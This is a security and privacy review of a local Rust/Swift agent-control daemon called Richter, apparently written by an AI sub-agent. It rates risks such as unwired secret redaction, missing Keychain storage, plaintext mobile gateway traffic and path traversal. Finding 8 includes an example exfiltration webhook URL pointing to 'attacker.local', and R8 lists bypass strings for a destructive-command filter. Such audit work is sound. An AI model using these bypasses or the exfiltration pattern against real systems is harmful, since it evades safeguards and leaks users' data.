# Richter Security & Privacy Review

**Scope:** Full Rust/Swift codebase at `crates/`, `apps/macos/`, `docs/SECURITY.md`, `docs/PRIVACY.md`
**Date:** 2026-05-17
**Reviewer:** Sub-agent 4 (Security & Privacy Reviewer)

---

## 1. Security Posture Assessment

Richter’s security model is **deliberate, well-documented, and above-average for a local developer tool.** The four stated principles (“No root”, “No cloud by default”, “Redaction first”, “Model output is advisory”) are actually reflected in the code. Key strengths:

- **No privilege escalation surface:** Daemon, CLI, MCP, and app all run as the current user. No `sudo`, `setuid`, system extensions, or kernel modules.
- **Unix domain socket with bearer token:** Socket at `~/.richter/daemon.sock` (0600) protected by a 256-bit hex token stored at `~/.richter/auth_token` (0600). Auth middleware uses constant-time comparison (`subtle::ConstantTimeEq`).
- **macOS Keychain claim for API keys:** Documentation states provider keys are stored in Keychain and never hit disk. The daemon requests them from the app over the authenticated socket.
- **LLM output is non-executing:** Model calls are restricted to importance classification and summarization. No LLM output can authorize destructive commands, modify policy, or execute shell code.
- **Secrets redaction engine:** Pattern-based regex redaction covers all major key formats (OpenAI, Anthropic, GitHub, AWS, GCP, Azure, JWT, private keys, DB URLs, Stripe, Slack).
- **CI-enforced supply-chain scanning:** `cargo audit` and `cargo deny check` are both required in CI before tests run. `deny.toml` denies copyleft, unapproved licenses, and wildcard dependencies.
- **Child-process isolation:** Spawns commands in their own process group via `setpgid`. Dangerous env keys (`PATH`, `LD_PRELOAD`, `DYLD_*`) are blocked from injection. Stall detection kills no-output processes after 5 minutes.
- **Mobile gateway (Phase 4) is opt-in and heavily layered:** Ed25519 signatures, 60-second timestamp windows, nonce bloom-filter replay protection, per-device token-bucket rate limiting (60 req/min), and scope-based authorization (`readonly`, `run_commands`, `approve_actions`).

**Overall posture:** Good-to-strong for a local tool, with a handful of material gaps that a security reviewer would flag.

---

## 2. Trust Boundary Analysis

| Boundary | Who/What Crosses It | Controls | Gaps |
|---|---|---|---|
| **User session** (daemon, CLI, app) | User-owned processes | File permissions (0600/0700), no root | None material |
| **Unix socket** (`daemon.sock`) | Other local user processes, agents | 0600 socket, 256-bit bearer token, constant-time compare | Token never rotated between restarts; no rate limiting |
| **MCP stdio/HTTP** | AI agents (Claude, Codex) | Unix socket auth for HTTP transport; stdio inherits OS permissions | stdio transport has no auth token validation (expected for MCP stdio) |
| **Mobile gateway TCP** | LAN/mobile devices | Ed25519 device signatures, replay nonces, scopes, rate limits | TLS is **not implemented** in code (`serve_mobile` ignores `_use_tls`); falls back to HTTP |
| **Model provider HTTPS** | Outbound to OpenAI/Anthropic/etc. | TLS with system certs, redacted payloads | No cert pinning; best-effort redaction only |
| **SQLite database** | Daemon reads/writes | WAL mode, integrity checks on open | No encryption at rest; file is user-readable (0600) |
| **Shell shims** | User shell | Symlinks in `~/.richter/shims` | Shims are user-writable; a compromised process could swap them |

---

## 3. Material Risks and Severity

### 🔴 Critical / High

| # | Risk | Severity | Evidence | Mitigation Status |
|---|---|---|---|---|
| R1 | **Redaction engine is not wired into the output capture pipeline.** `supervisor.rs` captures stdout/stderr in `append_output()` and stores it raw in the `SupervisedChild` buffer and the completed-map cache. `run_manager.rs` writes cached results to disk/DB without calling `redact()`. This means secrets captured from build/test output may be persisted unredacted, contrary to documented guarantees. | **High** | `supervisor.rs` `read_output` → `append_output()` has no redaction call. `run_manager.rs` `cache_result` stores raw output. | **Missing** |
| R2 | **Swift app stores `modelAPIKey` in plaintext UI state, not Keychain.** `SettingsView.swift` binds `SecureField("API Key", text: $editedSettings.modelAPIKey)` where `RichterSettings` is a plain `Codable` struct. No `SecItemAdd` / `SecItemCopyMatching` code was found in the Swift codebase. If settings are ever serialized to disk, the key is written in plaintext. This contradicts `docs/SECURITY.md`. | **High** | `DaemonClient.swift` has no Keychain code. `SettingsView.swift` uses in-memory string. | **Missing** |
| R3 | **Path traversal in `run_or_join` repo validation.** `run_manager.rs` canonicalizes `spec.repo` but only checks `starts_with($HOME)` or `/tmp`/`/private/tmp`/`/var`. Symlinks can escape these roots. There is no workspace-root boundary enforcement against `..` segments in the repo path. | **High** | `run_manager.rs`: `canonical_repo.starts_with(&home_path)` — symlink escape possible. | **Partial** |
| R4 | **Mobile gateway TLS is unimplemented.** The `serve_mobile` docs say “TLS setup” but the `_use_tls` parameter is explicitly ignored, with a comment stating “TLS termination can be handled by a reverse proxy.” When `lan_gateway=true`, the gateway binds `0.0.0.0` and serves plain HTTP. Any device on the LAN can sniff traffic. | **High** | `mobile_gateway.rs` `serve_mobile`: `let _use_tls = self.config.read().tls_enabled;` then comment about reverse proxy. | **Missing** |

### 🟡 Medium

| # | Risk | Severity | Evidence | Mitigation Status |
|---|---|---|---|---|
| R5 | **CORS layer on Unix socket API is overly broad.** `CorsLayer` allows four `localhost` origins (ports 3000, 5173) on a Unix socket that is already OS-protected. If socket permissions are ever mis-set or on a non-Unix platform, this opens an unnecessary attack surface. | **Medium** | `api.rs` `.allow_origin([...])` | **Present but excessive** |
| R6 | **`settings_put_handler` accepts arbitrary JSON with no schema validation.** Any authorized caller can overwrite the entire settings HashMap with arbitrary keys/values. No bounds on size, nesting, or key count. | **Medium** | `api.rs`: `Json<SettingsUpdate>` → `settings.insert(k, v)` with no validation loop. | **Missing** |
| R7 | **Webhook URLs are stored in memory with no URL validation or TLS pinning.** `WebhookConfig` takes a raw URL string. No check for `http://` vs `https://`, no secret length limits. | **Medium** | `webhooks.rs`: `url: String` with no validation. | **Missing** |
| R8 | **`is_destructive` gate is trivially bypassed.** It lowercases the command and checks string prefixes like `rm -rf`. Users can bypass with `rm -- -rf /tmp`, quoting, hex escapes, or aliases. This is a known limitation but should be called out. | **Medium** | `run_manager.rs`: `lower.contains("rm -rf")` | **Present, weak** |
| R9 | **No rate limiting on the Unix socket REST API.** The only rate limit is `ModelCallBudget` (30 calls/min for LLM). An authenticated local process could flood `/run_or_join` or `/events`. | **Medium** | `api.rs`: no rate-limit middleware. | **Missing** |
| R10 | **`auth_token` is held in `std::sync::OnceLock<String>` for the daemon lifetime and never zeroized.** On daemon restart a new token is generated, but there is no in-memory scrubbing. An attacker with local memory read capabilities (or a core dump) could extract the token. | **Medium** | `api.rs`: `Arc<std::sync::OnceLock<String>>` | **Missing** |
| R11 | **`claim` CLI does not validate workspace boundaries.** `claim.rs` canonicalizes the path but only for display; it does not check if the claimed path is within a watched repo, so a malicious agent could claim `/etc/passwd`. | **Medium** | `claim.rs`: no boundary check after canonicalization. | **Missing** |

### 🟢 Low / Advisory

| # | Risk | Severity | Evidence |
|---|---|---|---|
| R12 | **SQLite database is not encrypted at rest.** All historical commands, runs, and events are in plaintext on disk. | Low | `db.rs`: no SQLCipher or similar. |
| R13 | **Mobile gateway replay nonce tracker is in-memory only.** Nonce state is lost on daemon restart, allowing brief replay windows. | Low | `mobile_gateway.rs`: `NonceTracker` uses `RwLock<Vec<String>>`. |
| R14 | **`rand::thread_rng()` used for auth token generation instead of a CSPRNG.** While `thread_rng()` is cryptographically secure in `rand`, the code claims `/dev/urandom` but uses `rand::thread_rng().fill_bytes()`. Minor documentation drift. | Low | `api.rs`: comment says `256 bits of random from /dev/urandom` but code uses `thread_rng()`. |
| R15 | **MCP `run_or_join` tool allows arbitrary command execution with no additional sandbox.** An authenticated MCP agent can run any command via the daemon. This is by design but should be noted. | Low | `mcp_bridge.rs`: `RunOrJoinTool` passes command string directly to `run_manager`. |
| R16 | **Shell shim integrity relies on user-writable symlinks.** A compromised user process can rewrite `~/.richter/shims/cargo` to point elsewhere. | Low | `install.rs`: creates symlinks in user home. |

---

## 4. Input Validation Gaps

### 4.1 API Request Validation (`RunOrJoinRequest::validate`)

The `validate()` method in `api.rs` is **present but incomplete:**

- ✅ Checks `command` empty, max length (4096), forbidden chars (`\0`, `\n`, `\r`)
- ✅ Checks `repo` max length (4096), forbidden chars
- ✅ Checks `env` max entries (100), key/value max lengths
- ✅ Checks `classification` / `resource_class` max length (64)
- ❌ **Does NOT validate the repo path is within a configured workspace or watched root.** It accepts any string that passes length checks.
- ❌ **Does NOT check `..` segments in repo path.** Path traversal is possible.
- ❌ **Does NOT canonicalize the repo path before workspace boundary check.** Symlinks can escape.

### 4.2 Supervisor Command Validation (`validate_command`)

- ✅ Rejects empty, oversized (>4096), and forbidden-char commands
- ❌ **Does NOT block shell metacharacters** (`;`, `|`, `&&`, `$()`, backticks). `shlex::split` is used for safe parsing, but the raw string is still passed to `/bin/sh -c` when `use_shell=true`. A malformed command can execute multiple commands.

### 4.3 Settings Update Validation

- The `/settings` PUT endpoint accepts any `HashMap<String, serde_json::Value>`. There is no schema validation, size limit, or key whitelist.

### 4.4 Webhook URL Validation

- The `/webhooks` endpoint accepts a raw `url: String`. No URL parsing, no scheme enforcement (`https`), no length limit.

---

## 5. Secrets Handling Quality

### 5.1 Redaction Engine (`redact.rs`)

- **Strengths:** Comprehensive regex coverage of all common secret types (API keys, bearer tokens, private keys, GitHub PATs, AWS keys, DB URLs, JWTs, cookies, Stripe keys, Slack tokens, generic passwords).
- **Weaknesses:**
  - **Best-effort only.** Novel or obfuscated secrets will leak.
  - **Over-redaction risk.** Patterns like `(?i)(?:token|key|secret)\s*[:=]\s*[A-Za-z0-9+/=_-]{20,}` will mangle legitimate config or base64-encoded non-secrets.
  - **Binary data not processed.** Command output that includes binary data (e.g., image processing tools) will not be redacted.
  - **NOT ACTUALLY INVOKED IN THE CAPTURE PIPELINE (R1).** The redaction module exists and has unit tests, but the supervisor and run manager do not call `redact()` before persisting output.

### 5.2 Keychain Storage

- **Documentation claims:** API keys are stored in macOS Keychain via `SecItemAdd/CopyMatching/Update/Delete`.
- **Reality:** No Keychain code was found in the Swift codebase. The `SettingsView.swift` stores the API key in a `@State` string bound to a `SecureField`. Unless Keychain integration is in a file not yet committed, this is a **documentation-code gap.**

### 5.3 Auth Token Lifecycle

- **Generation:** `generate_auth_token()` creates a SHA-256 hash of 32 random bytes + a static pepper. File is created with 0600.
- **Rotation:** Only on daemon restart. No periodic rotation or revocation API.
- **Storage:** File on disk with 0600; also cached in `OnceLock<String>` in memory.
- **Disposal:** Not zeroized in memory.

### 5.4 Model Provider Key Handling in Memory

- The daemon holds the key only for the duration of an API call, then drops it. This is correct.
- **However**, if the Swift app leaks the key into settings serialization, the key may persist in `~/.richter/config.toml` or the SQLite DB.

---

## 6. Dependency / Supply Chain Posture

### 6.1 Cargo-deny (`deny.toml`)

- ✅ `vulnerability = "deny"`
- ✅ `unmaintained = "warn"`
- ✅ `yanked = "warn"`
- ✅ `copyleft = "deny"`
- ✅ `wildcards = "deny"`
- ✅ License allow-list is modern and safe (MIT, Apache-2.0, BSD, ISC, etc.)
- ⚠️ `default = "deny"` means any dependency with an unapproved license will break CI.

### 6.2 CI Enforcement

```yaml
audit:
  - cargo install cargo-audit
  - cargo audit
deny:
  - cargo install cargo-deny
  - cargo deny check
test:
  needs: [check, audit]
```

Tests cannot run if `cargo audit` or `cargo deny check` fails. This is a strong posture.

### 6.3 Dependency Surface

- **Networking:** `axum`, `tower-http`, `hyper`, `tokio` — well-maintained, high-adoption.
- **Crypto:** `sha2`, `blake3`, `ed25519-dalek` — audited, widely used.
- **SQLite:** `sqlx` with bundled SQLite — good for reproducibility.
- **Notable missing hardening:** No `cargo-vet` or `cargo-vendor` pin files. No SLSA signing.

### 6.4 Notable Transitive Dependencies

- `subtle` (constant-time comparison) — used correctly in auth middleware.
- `base64` — used for Ed25519 key encoding in mobile gateway.
- `rand` — used for token/nonce generation (CSPRNG via `thread_rng()`).

---

## 7. What a Security Reviewer Would Flag

A professional security auditor reviewing this codebase for a production security assessment would raise the following findings:

1. **“Redaction-at-rest gap”** — The redaction engine is unit-tested but not integrated into the data persistence path. This means secrets from command output can be written to `~/.richter/logs/` and the SQLite DB in plaintext. **Priority: fix immediately.**

2. **“Keychain claim vs. implementation gap”** — SECURITY.md states API keys live in Keychain. The committed Swift UI stores them in an in-memory struct field. Either implement Keychain storage or update the security documentation. **Priority: high.**

3. **“Mobile gateway plaintext exposure”** — The Phase 4 mobile gateway disables TLS by default in code and binds to all interfaces when LAN mode is enabled. An internal security team would block this feature until TLS is actually implemented. **Priority: high.**

4. **“Path traversal in run_or_join”** — The workspace boundary enforcement (documented as “symlink resolution + path traversal rejection”) does not exist in `run_manager.rs`. The canonicalization check can be bypassed via symlinks. A malicious agent could execute commands outside the workspace. **Priority: high.**

5. **“Destructive command preview is trivially bypassed”** — The `is_destructive` heuristic is a string `contains` check on a lowercased command. This is acknowledged as a “preview gate” but provides little real protection. A security team would recommend either removing the claim of protection or implementing a real sandbox/allowlist. **Priority: medium.**

6. **“No API rate limiting”** — The Unix socket API has no per-client rate limiting. A local process with the auth token could DoS the daemon. **Priority: medium.**

7. **“In-memory token not zeroized”** — The auth token is stored in a standard Rust `String` with no secure memory handling. For a tool coordinating AI agents, a core dump or memory pressure swap could leak the token. **Priority: low/medium.**

8. **“Webhook URL injection”** — Webhooks accept arbitrary URLs with no validation. A compromised settings client could set `url: "http://attacker.local/exfil"` and cause data exfiltration of redacted-but-still-sensitive build events. **Priority: medium.**

9. **“SQLite plaintext”** — The database contains full command history, paths, and agent metadata. No encryption at rest means a stolen Mac (without FileVault) or a backup of `~/.richter/` exposes all data. **Priority: low (OS-level mitigation expected).**

10. **“CORS on Unix socket”** — Adding CORS to a Unix domain socket is unnecessary. If the same router is ever reused for a TCP listener (e.g., HTTP fallback), the CORS policy is dangerously permissive. **Priority: low.**

---

## 8. Recommendations

| Priority | Action | File(s) |
|---|---|---|
| P0 | Wire `redact()` into supervisor `append_output()` and `run_manager` cache persistence before storage. | `supervisor.rs`, `run_manager.rs` |
| P0 | Implement macOS Keychain storage for `modelAPIKey` in the Swift app, or remove the Keychain claim from docs. | `SettingsView.swift`, `docs/SECURITY.md` |
| P1 | Enforce workspace root boundary in `run_or_join`: canonicalize repo, resolve symlinks, verify path starts with an approved watched root. | `run_manager.rs` |
| P1 | Implement TLS in `serve_mobile` using `tokio-rustls` with a self-signed cert generated on first launch. | `mobile_gateway.rs` |
| P1 | Add per-IP/client rate limiting middleware to the Unix socket API (e.g., `tower-governor`). | `api.rs` |
| P2 | Harden the destructive preview gate: use a parsed command allowlist instead of string matching. | `run_manager.rs` |
| P2 | Validate webhook URLs (require HTTPS, check host against an allowlist). | `webhooks.rs` |
| P2 | Add schema validation and size limits to `settings_put_handler`. | `api.rs` |
| P2 | Zeroize or securely clear the auth token from memory on daemon shutdown. | `api.rs`, `main.rs` |
| P3 | Consider SQLCipher or at-rest SQLite encryption for the database. | `db.rs` |
| P3 | Remove or narrow the CORS layer on the Unix socket router; restrict it only to TCP surfaces. | `api.rs` |

---

## 9. Summary

Richter is a **thoughtfully designed local agent-control plane with a strong security model.** The documentation is honest about limitations, and the architecture correctly avoids root, cloud, and LLM command execution. The mobile gateway Phase 4 design (Ed25519, nonces, scopes, rate limits) is impressive for an in-development feature.

The most important gaps are **integration gaps** rather than design flaws:
- Redaction is written but not wired into the live pipeline.
- Keychain storage is documented but not implemented in Swift.
- TLS is planned but not implemented in the mobile gateway.
- Workspace boundary enforcement is documented but missing from the run manager.

Fixing the four P0/P1 items would bring the codebase from “good local tool” to “enterprise-ready local agent plane.”
